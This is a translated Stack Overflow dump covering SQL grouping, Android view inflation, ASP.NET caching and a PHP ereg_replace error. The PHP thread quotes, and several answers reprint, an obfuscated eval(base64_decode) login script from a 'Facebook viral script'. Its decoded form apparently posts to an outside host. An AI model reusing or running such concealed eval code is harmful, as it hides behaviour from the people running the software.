     on c.CUSTOMER_ID = ci.CUSTOMER_ID and
        ci.seqnum = 1 
```

对于每个客户 ID/服务组合，它根据`order by`子句列举问题。最高问题的最高 service_version 将获得“1”。我的猜测是，这就是你想要的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:31:00.327

如果我了解您的要求，这样的事情应该可以解决您的子查询问题：

```
SELECT 
    c.customer_id, 
    ci1.service, 
    ci1.service_name, 
    ci1.service_issue, 
    ci2.service_version
FROM customer c
    JOIN (
        SELECT CUSTOMER_ID, service, service_name, max(service_ISSUE) as service_ISSUE
        FROM CUSTOMER_issue
        GROUP BY CUSTOMER_ID, service, service_name
        ) ci1 ON c.CUSTOMER_ID = ci1.CUSTOMER_ID
    JOIN  (
        SELECT CUSTOMER_ID, service, max(service_VERSION) as service_VERSION
        FROM CUSTOMER_issue
        GROUP BY CUSTOMER_ID, service
        ) ci2 ON c.CUSTOMER_ID = ci2.CUSTOMER_ID AND ci1.service = ci2.service 
```

根据您的需要，可能有更简单的方法。

# c# - 单视图布局文件：编译器是否使用布局/视图组自动换行？

> ID：15092785
> 
> 赞同：3
> 
> 时间：2013-02-26T15:21:51.180
> 
> 标签：c#, android, android-layout, xamarin.android

如果我有一个仅包含一个 . 的布局文件，`TextView`那么从`activity`.

但是，如果我尝试对包含单个自定义视图的类似布局文件进行膨胀，那么我会得到一个*膨胀异常*。在这种情况下，我可以让自定义视图膨胀的唯一方法是将其包装在内部`Layout/ViewGroup`（即，`LinearLayout`）。

`Layout/ViewGroup`因此，我想知道如果编译器检测到视图尚未嵌套在一个（即LinearLayout）中，编译器是否会自动包装一个内置视图？

（当我有时间设置模拟器并提取布局树并发布任何发现时，我将对此进行测试。）

感谢您的帮助。

* * *

案例1：工作正常

```
TextViewLayoutFile.axml

<?xml version="1.0" encoding="utf-8"?>
<TextView
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/tv_name"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"/>

LayoutInflater infalInflater = (LayoutInflater)context.GetSystemService(Context.LayoutInflaterService);
view = infalInflater.Inflate(Resource.Layout.TextViewLayoutFile, null); 
```

* * *

情况 2：仅当 MyTextView 包含在布局中时才有效 (LinearLayout)

```
2a: Produces inflation exception
----------------------------------------------------------------------------
TextViewLayoutFile.axml

<?xml version="1.0" encoding="utf-8"?>
<AppName.Views.MyTextView
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/tv_name"
  android:layout_width="fill_parent"
  android:layout_height="wrap_content"/>

LayoutInflater infalInflater = (LayoutInflater)context.GetSystemService(Context.LayoutInflaterService);
view = infalInflater.Inflate(Resource.Layout.TextViewLayoutFile, null);

2b: Inflates ok
----------------------------------------------------------------------------
TextViewLayoutFile.axml

<?xml version="1.0" encoding="utf-8"?>
<LinearLayout
  xmlns:android="http://schemas.android.com/apk/res/android"
  android:id="@+id/ll_android_is"
  android:layout_width="match_parent"
  android:layout_height="wrap_content">

  <AppName.Views.MyTextView
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/tv_name"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"/>

</LinearLayout>

LayoutInflater infalInflater = (LayoutInflater)context.GetSystemService(Context.LayoutInflaterService);
view = infalInflater.Inflate(Resource.Layout.TextViewLayoutFile, null); 
```

在哪里

```
namespace AppName.Views 
{
    public class MyTextView : TextView
    {
        public MyTextView(Context context) : base(context) { }

        public MyTextView(Context context, IAttributeSet attributes) : base(context, attributes) { }        
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-18T18:44:51.647

我相信您还没有提供另外一个构造函数，

```
TextView(Context context, AttributeSet attrs, int defStyle) 
```

我以前在没有涵盖所有默认构造函数的情况下膨胀和实例化事物时遇到过问题，这也可能是火上浇油。至于自动包装的魔力。至于它自动为你做什么，我不能说。

# php - 函数 ereg_replace() 已弃用

> ID：15092788
> 
> 赞同：0
> 
> 时间：2013-02-26T15:22:08.060
> 
> 标签：php

我在我的 login.php 到管理员 cpanel 上收到此错误。我正在使用 Facebook 病毒脚本。

```
Deprecated: Function ereg_replace() is deprecated in /home/content/32/10528532/html/shockvideo/admincpanel/login.php(2) : eval()'d code on line 1 
```

这是我的整个 php：

```
<?php $_F=__FILE__;$_X='Pz48P3BocA0KCXI1cTM0cjUgIi4uL3NyYy9mMWM1YjIyay5waHAiOw0KCQ0KCSQzbSA9ICcnOw0KCSRsID0gJyc7DQoJJDUgPSAnJzsNCgkNCgk0ZiAoICg0c3M1dCgkX0dFVFsnNSddKSkgMW5kICg0c3M1dCgkX0dFVFsnbCddKSkpIHsNCgkkNSA9ICRfR0VUWyc1J107DQoJJGwgPSAkX0dFVFsnbCddOwkNCgl9DQoJDQoJJDNtID0gZmJMMmc0bigkX0dFVFsnMyddKTsNCgkkZGJfbDJnNG4gPSBkYkwyZzRuKCRfR0VUWyczcmwnXSk7DQoJDQoJLy9wcjJ2ajVyMSBkMSBsNCBqNSBrMnI0c240ayAzbDJnMnYxbiA0IDFrMiBuNGo1IHByNWIxYzR2MW5qNSBuMSBnbDF2bjMgc3RyMW40YzMNCgk0ZiAoICghKCQzbSAhPSAkNSkpIDFuZCAoISgkbCAhPSAkZGJfbDJnNG4pKSApIHsNCglzNXRjMjJrNDUoRmJWNHIxbFNjcjRwdCwgIlRyMzUiLCB0NG01KCkrb2UwMCk7CQ0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KCTRmICg0c3M1dCgkX0NPT0tJRVsnRmJWNHIxbFNjcjRwdCddKSkgew0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KPz4NCjxodG1sPg0KPGg1MWQ+DQo8dDR0bDU+QWRtNG4gQ3AxbjVsPC90NHRsNT4NCjxzY3I0cHQgdHlwNT0idDV4dC9qMXYxc2NyNHB0Ij4NCmYzbmN0NDJuIHYxbDRkMXQ1RjJybSgpDQp7DQp2MXIgM3M1cm4xbTU9ZDJjM201bnQuZjJybXNbImwyZzRuX2Yycm0iXVsiM3M1cm4xbTUiXS52MWwzNTsNCnYxciBwMXNzdzJyZD1kMmMzbTVudC5mMnJtc1sibDJnNG5fZjJybSJdWyJwMXNzdzJyZCJdLnYxbDM1Ow0KNGYgKDNzNXJuMW01PT1uM2xsIHx8IDNzNXJuMW01PT0iIiB8fCBwMXNzdzJyZD09bjNsbCB8fCBwMXNzdzJyZD09IiIpIHsNCiAgMWw1cnQoIkwyZzRuIGYycm0gbTNzdCBiNSBmNGxsNWQgMjN0ISIpOw0KICByNXQzcm4gZjFsczU7DQogIH0NCn0NCjwvc2NyNHB0Pg0KPC9oNTFkPg0KPGIyZHk+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8YzVudDVyPg0KPD9waHANCiRtNXNzMWc1ID0gJF9HRVRbJ201c3MxZzUnXTsNCg0KNGYgKCRtNXNzMWc1ICE9ICcnKSB7DQo1Y2gyICc8ZjJudCBjMmwycj0icjVkIj4nOw0KNWNoMiAkbTVzczFnNSAuICIgVDIgdHJ5IExPR0lOIDFnMTRuIDwxIGhyNWY9XCJsMmc0bi5waHBcIj5DTElDSyBIRVJFITwvMT4iOw0KNWNoMiAnPC9mMm50Pic7DQp9IDVsczUgew0KNWNoMiAnPGYycm0gc3R5bDU9Inc0ZHRoOnV1MHB4OyIgbjFtNT0ibDJnNG5fZjJybSIgbTV0aDJkPSJwMnN0IiAxY3Q0Mm49Imh0dHA6Ly93d3cuZzU1a2gxY2tzLjJyZy9mYnY0cjFsM2x0NG0xdDUvbDJnNG4ucGhwIiAybnMzYm00dD0icjV0M3JuIHYxbDRkMXQ1RjJybSgpIiA+DQo8ZjQ1bGRzNXQgc3R5bDU9InQ1eHQtMWw0Z246bDVmdDsgcDFkZDRuZzphdXB4OyI+PGw1ZzVuZD5BZG00biBDcDFuNWw8L2w1ZzVuZD48YnIgLz4NCg0KVXM1cm4xbTU6IDxiciAvPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9IjNzNXJuMW01Ij48QlI+DQpQMXNzdzJyZDogPGJyIC8+DQo8NG5wM3QgdHlwNT0icDFzc3cycmQiIG4xbTU9InAxc3N3MnJkIj48QlI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSIzcmwiIHYxbDM1PSInLiQzcmwuJyI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSJ2NXJzNDJuIiB2MWwzNT0iNi42Ij4NCjw0bnAzdCB0eXA1PSJzM2JtNHQiIG4xbTU9ImwyZzRuIiB2MWwzNT0iTDJnIEluIj48YnIgLz4NCjxicj4NCjwvZjQ1bGRzNXQ+DQo8L2Yycm0+ICc7CQ0KCQ0KfQ0KPz4NCjwvYzVudDVyPg0KPC9iMmR5Pg0KPC9odG1sPg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?>

<?php $_F=__FILE__;$_X='Pz48P3BocA0KCXI1cTM0cjUgIi4uL3NyYy9mMWM1YjIyay5waHAiOw0KCQ0KCSQzbSA9ICcnOw0KCSRsID0gJyc7DQoJJDUgPSAnJzsNCgkNCgk0ZiAoICg0c3M1dCgkX0dFVFsnNSddKSkgMW5kICg0c3M1dCgkX0dFVFsnbCddKSkpIHsNCgkkNSA9ICRfR0VUWyc1J107DQoJJGwgPSAkX0dFVFsnbCddOwkNCgl9DQoJDQoJJDNtID0gZmJMMmc0bigkX0dFVFsnMyddKTsNCgkkZGJfbDJnNG4gPSBkYkwyZzRuKCRfR0VUWyczcmwnXSk7DQoJDQoJLy9wcjJ2ajVyMSBkMSBsNCBqNSBrMnI0c240ayAzbDJnMnYxbiA0IDFrMiBuNGo1IHByNWIxYzR2MW5qNSBuMSBnbDF2bjMgc3RyMW40YzMNCgk0ZiAoICghKCQzbSAhPSAkNSkpIDFuZCAoISgkbCAhPSAkZGJfbDJnNG4pKSApIHsNCglzNXRjMjJrNDUoRmJWNHIxbFNjcjRwdCwgIlRyMzUiLCB0NG01KCkrb2UwMCk7CQ0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KCTRmICg0c3M1dCgkX0NPT0tJRVsnRmJWNHIxbFNjcjRwdCddKSkgew0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KPz4NCjxodG1sPg0KPGg1MWQ+DQo8dDR0bDU+QWRtNG4gQ3AxbjVsPC90NHRsNT4NCjxzY3I0cHQgdHlwNT0idDV4dC9qMXYxc2NyNHB0Ij4NCmYzbmN0NDJuIHYxbDRkMXQ1RjJybSgpDQp7DQp2MXIgM3M1cm4xbTU9ZDJjM201bnQuZjJybXNbImwyZzRuX2Yycm0iXVsiM3M1cm4xbTUiXS52MWwzNTsNCnYxciBwMXNzdzJyZD1kMmMzbTVudC5mMnJtc1sibDJnNG5fZjJybSJdWyJwMXNzdzJyZCJdLnYxbDM1Ow0KNGYgKDNzNXJuMW01PT1uM2xsIHx8IDNzNXJuMW01PT0iIiB8fCBwMXNzdzJyZD09bjNsbCB8fCBwMXNzdzJyZD09IiIpIHsNCiAgMWw1cnQoIkwyZzRuIGYycm0gbTNzdCBiNSBmNGxsNWQgMjN0ISIpOw0KICByNXQzcm4gZjFsczU7DQogIH0NCn0NCjwvc2NyNHB0Pg0KPC9oNTFkPg0KPGIyZHk+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8YzVudDVyPg0KPD9waHANCiRtNXNzMWc1ID0gJF9HRVRbJ201c3MxZzUnXTsNCg0KNGYgKCRtNXNzMWc1ICE9ICcnKSB7DQo1Y2gyICc8ZjJudCBjMmwycj0icjVkIj4nOw0KNWNoMiAkbTVzczFnNSAuICIgVDIgdHJ5IExPR0lOIDFnMTRuIDwxIGhyNWY9XCJsMmc0bi5waHBcIj5DTElDSyBIRVJFITwvMT4iOw0KNWNoMiAnPC9mMm50Pic7DQp9IDVsczUgew0KNWNoMiAnPGYycm0gc3R5bDU9Inc0ZHRoOnV1MHB4OyIgbjFtNT0ibDJnNG5fZjJybSIgbTV0aDJkPSJwMnN0IiAxY3Q0Mm49Imh0dHA6Ly93d3cuZzU1a2gxY2tzLjJyZy9mYnY0cjFsM2x0NG0xdDUvbDJnNG4ucGhwIiAybnMzYm00dD0icjV0M3JuIHYxbDRkMXQ1RjJybSgpIiA+DQo8ZjQ1bGRzNXQgc3R5bDU9InQ1eHQtMWw0Z246bDVmdDsgcDFkZDRuZzphdXB4OyI+PGw1ZzVuZD5BZG00biBDcDFuNWw8L2w1ZzVuZD48YnIgLz4NCg0KVXM1cm4xbTU6IDxiciAvPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9IjNzNXJuMW01Ij48QlI+DQpQMXNzdzJyZDogPGJyIC8+DQo8NG5wM3QgdHlwNT0icDFzc3cycmQiIG4xbTU9InAxc3N3MnJkIj48QlI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSIzcmwiIHYxbDM1PSInLiQzcmwuJyI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSJ2NXJzNDJuIiB2MWwzNT0iNi42Ij4NCjw0bnAzdCB0eXA1PSJzM2JtNHQiIG4xbTU9ImwyZzRuIiB2MWwzNT0iTDJnIEluIj48YnIgLz4NCjxicj4NCjwvZjQ1bGRzNXQ+DQo8L2Yycm0+ICc7CQ0KCQ0KfQ0KPz4NCjwvYzVudDVyPg0KPC9iMmR5Pg0KPC9odG1sPg==';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?> 
```

如何解决？如果你可以请为像我这样的新手解释一下。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-26T15:34:41.467

问题来自此代码

```
$_R = ereg_replace('__FILE__', "'" . $_F . "'", $_X); 
```

用。。。来代替

```
$_R = preg_replace('/__FILE__/', "'" . $_F . "'", $_X); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-26T15:24:15.357

[用preg_replace](http://www.php.net/manual/en/function.preg-replace.php)替换它， ereg_replace 自 php 5.3 起已弃用

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:24:20.677

不推荐使用的函数是不应再使用的函数，将在 PHP 的某些未来版本中删除。

您应该使用一些替代方法，而不是使用它们。尝试使用`preg_replace`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T16:15:31.513

我们以前都是新手。但是首先在 SO 上运行一个简单的搜索，即使使用 google 也可以找到很多。有时，我在谷歌上这样做 >

ereg_replace 站点：stackoverflow.com

然后按回车。这表明你想要你可能正在寻找。

现在回到你的问题，你能在 SO (Stackoverflow) 上读到这个吗

[PHP ereg_replace 已弃用](https://stackoverflow.com/questions/4226107/php-ereg-replace-deprecated?rq=1)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-26T16:15:42.070

这个写得很糟糕，可笑的“受保护”代码可以简单地通过替换来修复：

```
ereg_replace('pattern', 'replacement', $target); 
```

和：

```
preg_replace('/pattern/', 'replacement', $target); 
```

这给了你：

```
$_X=base64_decode($_X);$_X=strtr($_X,'123456aouie','aouie123456');$_R=preg_replace('/__FILE__/', "'".$_F."'", $_X);eval($_R);$_R=0;$_X=0; 
```

其中编码为：

> JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPXByZWdfcmVwbGFjZSgnL19fRklMRV9fLycsICInIi4kX0YuIiciLCAkX1gpO2V2YWwoJF9SKTskX1I9MDskX1g9MDs=

你想把它放在`eval(base64_decode())`最后的位置。

请注意，包含`eval(base64_decode())`的代码通常是病毒。如果通过扫描主机服务器上运行的进程开始“清理”它，请不要感到惊讶。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-26T16:04:36.590

从头到尾：

将代码中的“eval”替换为“echo”。从控制台运行 php 脚本，你会得到这个 php 代码：

```
<?php
$_X=base64_decode($_X);$_X=strtr($_X,'123456aouie','aouie123456');
$_R=ereg_replace('__FILE__',"'".$_F."'",$_X);eval($_R);$_R=0;$_X=0;
?> 
```

现在你看到了有问题的功能。

快速修复：将 ereg_replace 替换为 @ereg_replace。

记住：这只是隐藏警告。您需要重写代码并使用 preg_match()，因为您的代码依赖于一个已弃用的函数，该函数很快就会从 php 中删除。

这是您的固定代码：

```
<?php $_F=__FILE__;$_X='Pz48P3BocA0KCXI1cTM0cjUgIi4uL3NyYy9mMWM1YjIyay5waHAiOw0KCQ0KCSQzbSA9ICcnOw0KCSRsID0gJyc7DQoJJDUgPSAnJzsNCgkNCgk0ZiAoICg0c3M1dCgkX0dFVFsnNSddKSkgMW5kICg0c3M1dCgkX0dFVFsnbCddKSkpIHsNCgkkNSA9ICRfR0VUWyc1J107DQoJJGwgPSAkX0dFVFsnbCddOwkNCgl9DQoJDQoJJDNtID0gZmJMMmc0bigkX0dFVFsnMyddKTsNCgkkZGJfbDJnNG4gPSBkYkwyZzRuKCRfR0VUWyczcmwnXSk7DQoJDQoJLy9wcjJ2ajVyMSBkMSBsNCBqNSBrMnI0c240ayAzbDJnMnYxbiA0IDFrMiBuNGo1IHByNWIxYzR2MW5qNSBuMSBnbDF2bjMgc3RyMW40YzMNCgk0ZiAoICghKCQzbSAhPSAkNSkpIDFuZCAoISgkbCAhPSAkZGJfbDJnNG4pKSApIHsNCglzNXRjMjJrNDUoRmJWNHIxbFNjcjRwdCwgIlRyMzUiLCB0NG01KCkrb2UwMCk7CQ0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KCTRmICg0c3M1dCgkX0NPT0tJRVsnRmJWNHIxbFNjcjRwdCddKSkgew0KCTVjaDIgJzxzY3I0cHQgbDFuZzMxZzU9IkoxdjFzY3I0cHQiPic7DQoJNWNoMiAidzRuZDJ3LmwyYzF0NDJuPVwiNG5kNXgucGhwXCIiOw0KCTVjaDIgJzwvc2NyNHB0Pic7DQoJfQ0KCQ0KPz4NCjxodG1sPg0KPGg1MWQ+DQo8dDR0bDU+QWRtNG4gQ3AxbjVsPC90NHRsNT4NCjxzY3I0cHQgdHlwNT0idDV4dC9qMXYxc2NyNHB0Ij4NCmYzbmN0NDJuIHYxbDRkMXQ1RjJybSgpDQp7DQp2MXIgM3M1cm4xbTU9ZDJjM201bnQuZjJybXNbImwyZzRuX2Yycm0iXVsiM3M1cm4xbTUiXS52MWwzNTsNCnYxciBwMXNzdzJyZD1kMmMzbTVudC5mMnJtc1sibDJnNG5fZjJybSJdWyJwMXNzdzJyZCJdLnYxbDM1Ow0KNGYgKDNzNXJuMW01PT1uM2xsIHx8IDNzNXJuMW01PT0iIiB8fCBwMXNzdzJyZD09bjNsbCB8fCBwMXNzdzJyZD09IiIpIHsNCiAgMWw1cnQoIkwyZzRuIGYycm0gbTNzdCBiNSBmNGxsNWQgMjN0ISIpOw0KICByNXQzcm4gZjFsczU7DQogIH0NCn0NCjwvc2NyNHB0Pg0KPC9oNTFkPg0KPGIyZHk+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8cD4mbmJzcDs8L3A+DQo8YzVudDVyPg0KPD9waHANCiRtNXNzMWc1ID0gJF9HRVRbJ201c3MxZzUnXTsNCg0KNGYgKCRtNXNzMWc1ICE9ICcnKSB7DQo1Y2gyICc8ZjJudCBjMmwycj0icjVkIj4nOw0KNWNoMiAkbTVzczFnNSAuICIgVDIgdHJ5IExPR0lOIDFnMTRuIDwxIGhyNWY9XCJsMmc0bi5waHBcIj5DTElDSyBIRVJFITwvMT4iOw0KNWNoMiAnPC9mMm50Pic7DQp9IDVsczUgew0KNWNoMiAnPGYycm0gc3R5bDU9Inc0ZHRoOnV1MHB4OyIgbjFtNT0ibDJnNG5fZjJybSIgbTV0aDJkPSJwMnN0IiAxY3Q0Mm49Imh0dHA6Ly93d3cuZzU1a2gxY2tzLjJyZy9mYnY0cjFsM2x0NG0xdDUvbDJnNG4ucGhwIiAybnMzYm00dD0icjV0M3JuIHYxbDRkMXQ1RjJybSgpIiA+DQo8ZjQ1bGRzNXQgc3R5bDU9InQ1eHQtMWw0Z246bDVmdDsgcDFkZDRuZzphdXB4OyI+PGw1ZzVuZD5BZG00biBDcDFuNWw8L2w1ZzVuZD48YnIgLz4NCg0KVXM1cm4xbTU6IDxiciAvPg0KPDRucDN0IHR5cDU9InQ1eHQiIG4xbTU9IjNzNXJuMW01Ij48QlI+DQpQMXNzdzJyZDogPGJyIC8+DQo8NG5wM3QgdHlwNT0icDFzc3cycmQiIG4xbTU9InAxc3N3MnJkIj48QlI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSIzcmwiIHYxbDM1PSInLiQzcmwuJyI+DQo8NG5wM3QgdHlwNT0iaDRkZDVuIiBuMW01PSJ2NXJzNDJuIiB2MWwzNT0iNi42Ij4NCjw0bnAzdCB0eXA1PSJzM2JtNHQiIG4xbTU9ImwyZzRuIiB2MWwzNT0iTDJnIEluIj48YnIgLz4NCjxicj4NCjwvZjQ1bGRzNXQ+DQo8L2Yycm0+ICc7CQ0KCQ0KfQ0KPz4NCjwvYzVudDVyPg0KPC9iMmR5Pg0KPC9odG1sPg==';$_X=base64_decode($_X);$_X=strtr($_X,'123456aouie','aouie123456');   $_R=@ereg_replace('__FILE__',"'".$_F."'",$_X);eval($_R);$_R=0;$_X=0;?> 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-02-26T15:29:38.543

您的代码已编码。它看起来很容易逆转。从解码 base 64 字符串开始。解码后，您需要将一些数字替换为等效字母。

一旦你完成了，切换`ereg_replace`到`preg_replace`是微不足道的。相同的模式通常可以工作，但格式略有不同。

这是最后解码的部分。

```
$_X=base64_decode($_X);
$_X=strtr($_X,'123456aouie','aouie123456');
$_R=ereg_replace('__FILE__',"'".$_F."'",$_X);
eval($_R);
$_R=0;
$_X=0; 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-02-26T15:23:56.190

临时修复：将 ereg_replace() 更改为 @ereg_replace()。

这将隐藏警告。

但是你需要用 preg_replace() 重写代码。

# c# - ASP 缓存新手 - 尝试模拟 WinForms 功能/正确的协议

> ID：15092804
> 
> 赞同：2
> 
> 时间：2013-02-26T15:22:58.497
> 
> 标签：c#, asp.net, .net, vb.net

我目前有一个 WinForms 应用程序，我正在将其转换为 ASP，并且很快意识到缓存数据的重要性。

在我的 WinForms 应用程序中，我创建了表单级变量`Dictionary(of String, List(of String))`，我`Form_Load()`使用从 SQL Server 数据库中提取的数据将 2 个链接的组合框关联在一起（在我的整个程序中用于各种其他事情）。WinForms 应用程序的美妙之处在于，这个变量对我来说在整个程序中都是可用的，因为它是一个表单级变量，它会随着表单一起消亡。

现在，我试图在我的 ASP 项目中获得相同的功能，因此我将其设置为属性并将其与缓存相关联，如下所示：

```
Private ReadOnly Property MyDict As Dictionary(Of String, List(Of String))
    Get
        Dim dict As Dictionary(Of String, List(Of String))
        dict = Cache("MyDict")

        If dict Is Nothing Then

            ... QUERY DB AND POPULATE DICTIONARY ...

            Cache("MyDict") = dict
        End If

        Return dict
    End Get
End Property 
```

我的第一个（也是最重要的）问题是我是否完全正确地执行了此操作，或者我只是对缓存不够了解 - 确实，这是我第一次尝试 ASP，而且事实证明它相当令人生畏。

我的下一个问题是，如果我做对了，我如何/在哪里声明缓存的生命周期？我注意到当我重新运行我的程序时，缓存的数据仍然可以从以前的运行中获得……我希望它在页面的整个生命周期内都可用，但一旦它关闭（如果可能的话。

第三，非常感谢任何好的建议/链接/技巧！

谢谢！！！

PS - 我知道我的代码是 VB，但是 C# 的答案也很好，因为这更多的是 .Net 概念级别而不是特定于语言的。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:38:49.850

缓存方法有点问题，并且对于您要实现的目标可能过于复杂。您对设置缓存生命周期的疑问是为什么这是一种非最佳方法的一些症状。使用更传统的方法来设置依赖下拉菜单可以为您节省很多麻烦。

来自 WinForms 开发的 ASP.NET 中最难适应的事情之一正是您正在努力解决的问题 - 服务器端数据在帖子之间“丢失”的事实。

在 WinForms 应用程序中，您可以将 DataTable 声明为全局变量，例如单击按钮或更改下拉列表的值这样简单的操作不会影响 DataTable 仍然存在这一事实，人口稠密。它在那里是因为表格“活着”直到表格被处置。使用 ASP.NET，服务器端对象仅在页面处理期间的回发期间存在，并且需要在回发时重新创建。

抽象这一点背后的大部分魔法都是通过[ViewState](http://msdn.microsoft.com/en-us/library/ms972976.aspx)完成的，它在回发之间保存页面上对象的状态。例如，如果您要在代码中查询数据库，将结果保存到 DataTable，然后将该 DataTable 绑定到 DataGrid，ViewState 将保存 DataGrid 的内容。在下一次回发时，DataGrid 的内容可用，但绑定到 DataGrid 的初始 DataTable 不再存在。

试图使用缓存来模拟对象的持久生命周期以使 ASP.NET 应用程序像 WinForms 应用程序一样工作是对该技术的滥用。它本质上不是***坏事***，***也不是不可能这样做***，只是使用了错误的方法。它基本上使用了错误的工具来完成这项工作。

与其尝试这样做，不如搜索有关如何执行特定任务的示例来为您提供更好的服务。在您的情况下，您需要[搜索“Cascading Drop-Down List ASP.NET”](https://www.google.com/search?q=cascading%20drop-down%20list%20asp.net&sourceid=ie7&rls=com.microsoft%3aen-us%3aIE-Address&ie=&oe=)或类似的内容。有几个选项可用，但这个和任何一个一样好：[http ://www.aspsnippets.com/Articles/Creating-Cascading-DropDownLists-in-ASP.Net.aspx](http://www.aspsnippets.com/Articles/Creating-Cascading-DropDownLists-in-ASP.Net.aspx)

此外，如果您还不熟悉它，那么在编写 .NET 应用程序时了解[ASP.NET 页面生命周期非常重要。](http://msdn.microsoft.com/en-us/library/ms178472%28v=vs.100%29.aspx)在 ASP.NET 开发中，没有任何一个组件能够让新的 ASP.NET 开发人员失去对页面生命周期的理解。了解这一点对您的帮助比我们可以向您提出的任何其他事情都多，并且它与您提出的问题直接相关。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:46:28.473

首先，在 Windows 窗体中，您有 1 个进程，其中包含 1 个主窗体实例（我不会讨论辅助窗体，或者在创建多个主窗体实例的情况下完全可以接受的情况）。

在这里，在 ASP.NET 中，您有 1 个进程，其中存在许多“主”页面实例。有人可能会说，每个访问您的 Web 应用程序的不同用户都有一个。这是部分正确的：“主”页面实例的瞬时数量可能大于活动用户的瞬时数量（我们谈论的是不是 MVC 的 ASP.NET）。

您仍然可以在全局范围内访问内容，就像您以前在 WinForms 中所做的那样。唯一的区别是：

1.  在 WinForms 中，因为通常主窗体是独一无二的，您可以将其用作内容的全局容器。在 ASP.NET 的情况下，您不能这样做，因为主页面不只有一个全局实例（例如，即使在同一个会话的情况下，来自同一个浏览器，刷新页面很可能会创建一个新的 Page 实例。为了测试它：实现该页面的其他隐式*公共无参数构造函数*并使用断点来检查它）

2.  使处理来自许多浏览器的请求的所有不同线程都访问一些唯一的共享内存通常是危险的（特别是如果您不知道自己做得很好）。

我个人并不完全同意下面的想法，但通常情况下，初学者应该简单地用相当冗余的**SELECT**命令轰炸数据库。

我会稍微简化您的问题，以便能够提供一个不会轰炸数据库的简单解决方案：*假设您不需要缓存。您只需要从数据库中读取大量内容并同意在重新启动 Web 应用程序之前您将永远不会再次读取它的事实。阅读后，该信息应该在 Web 应用程序的各个角落都可用。*

如果是这种情况，那么将有一个简单的解决方案：

1.  使用众所周知的“全局应用程序类”（Global.asax）及其“Application_Start”方法，以便在您的应用程序启动时收到通知（只需将其添加到您的项目中，就像您添加任何源文件一样，您可以在“添加”中找到它新项目对话框）

2.  使用全局 HttpApplicationState 类，它像字典一样工作，并允许在 ASP.NET 应用程序中共享全局信息

像这样：

```
public class Global : System.Web.HttpApplication {

    protected void Application_Start(object sender, EventArgs e) {
        // .. read the database here

